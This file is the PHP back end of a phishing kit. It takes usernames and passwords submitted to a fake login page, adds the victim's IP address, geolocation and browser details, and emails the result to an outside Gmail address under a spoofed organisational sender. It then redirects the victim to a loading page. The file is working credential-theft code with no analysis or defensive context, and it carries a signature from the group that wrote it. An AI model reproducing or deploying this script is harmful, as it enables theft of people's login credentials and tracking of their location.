<?php
$email = $_POST['username'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "============= [ Midnightcr3w Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'CityNGO';
$subj = "Result";
$from = "From: ticket@cityngo.org";
mail("perryoha@gmail.com",$subj,$message,$from,$domain);

header("Location: loading.php");
?>